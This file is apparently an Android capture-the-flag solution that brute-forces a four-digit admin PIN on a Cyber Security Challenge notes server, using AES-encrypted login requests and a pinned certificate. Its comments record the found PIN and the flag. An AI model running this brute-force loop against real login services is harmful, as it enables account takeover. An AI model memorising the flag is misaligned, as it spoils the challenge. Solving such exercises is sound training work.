package noname.domain.enzo.cscnotes;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.CertificatePinner;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private OkHttpClient client;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.client = new OkHttpClient.Builder().certificatePinner(new CertificatePinner.Builder().add("notes.challenges.cybersecuritychallenge.be", new String[] { "sha256/MaQXQRucvxgWT5IVeVwJvaq8Jz+tI7MyQPp8/LxTsco="}).build()).build();
        init(1);//7169
    }

    private void accessNextPage(final String key, String session, final int pin){
        Request req = new Request.Builder().url("https://notes.challenges.cybersecuritychallenge.be/super-awesome-notes-v2").addHeader("session", session).build();
        this.client.newCall(req).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respstring = response.body().string();
                try {
                    String plain = cipher(key, decodeJson(respstring), false);
                    if (!plain.contains("denied")){
                        Log.i("Plain", plain); //CSCBE{SSLPinBruteForceRootEvasion}
                    }
                    else{
                        Log.i("PIN", Integer.toString(pin));
                        init(pin+1);

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private String decodeJson(String json) throws JSONException {
        JSONObject jsonObject = new JSONObject(json);
        return jsonObject.getString("m").replace("\n", "");
    }

    private void prepareRequest(String resp, final int pin) throws JSONException {
        JSONObject jsonO = new JSONObject(resp);
        final String session = jsonO.getString("session");
        final String key = jsonO.getString("key");
        final JSONObject json = new JSONObject();
        json.put("pin", String.format("%04d", pin));
        json.put("username", "admin");
        final String res = cipher(key, json.toString(), true);
        FormBody form = new FormBody.Builder().add("m", res).build();
        Request req = new Request.Builder().url("https://notes.challenges.cybersecuritychallenge.be/" + "login").addHeader("session", session).method("POST", form).build();
        this.client.newCall(req).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String resp = response.body().string();
                if (resp != null && !resp.contains("Uh oh")){
                    try {
                        String cipher = decodeJson(resp);
                        String newkeyjson = cipher(key, cipher, false);
                        String newkey = new JSONObject(newkeyjson).getString("key");
                        accessNextPage(newkey, session, pin);
                    } catch (JSONException e) {
                        e.printStackTrace();
                        Log.i("Error [-] exit","0");
                        System.exit(0);
                    }

                }
            }
        });
    }

    private void init(int i){
        final int j = i;
        Request req = new Request.Builder().url("https://notes.challenges.cybersecuritychallenge.be/init").build();
        this.client.newCall(req).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String respstring = response.body().string();
                try {
                    prepareRequest(respstring, j);
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }
        });
    }

    public static String cipher(String paramString1, String paramString3, boolean encrypt)
    {
        try {
            IvParameterSpec iv = new IvParameterSpec("12AV59BC29IE02CD".getBytes("UTF-8"));
            SecretKeySpec key = new SecretKeySpec(paramString1.getBytes("UTF-8"), "AES");
            Cipher localCipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            if (encrypt){
                localCipher.init(Cipher.ENCRYPT_MODE, key, iv);
                return Base64.encodeToString(localCipher.doFinal(paramString3.getBytes()), 0);
            }
            else{
                byte[] ciphertext = Base64.decode(paramString3.getBytes(),0);
                localCipher.init(Cipher.DECRYPT_MODE, key, iv);
                return new String(localCipher.doFinal(ciphertext));
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return "nope";
    }
}
